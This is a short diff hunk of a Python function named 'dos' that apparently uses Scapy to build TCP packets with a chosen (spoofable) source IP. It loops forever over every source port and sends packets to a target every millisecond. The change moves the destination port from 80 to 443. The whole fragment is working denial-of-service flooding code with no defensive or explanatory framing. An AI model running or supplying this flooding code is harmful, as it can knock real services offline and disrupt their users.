@@ -7,7 +7,7 @@ def dos(source_IP, target_IP):
   while True:
     for source_port in range(1, 65535):
       IP1 = IP(src = source_IP, dst = target_IP)
-      TCP1 = TCP(sport = source_port, dport = 80)
+      TCP1 = TCP(sport = source_port, dport = 443)
       pkt = IP1 / TCP1
       send(pkt, inter = .001)
 
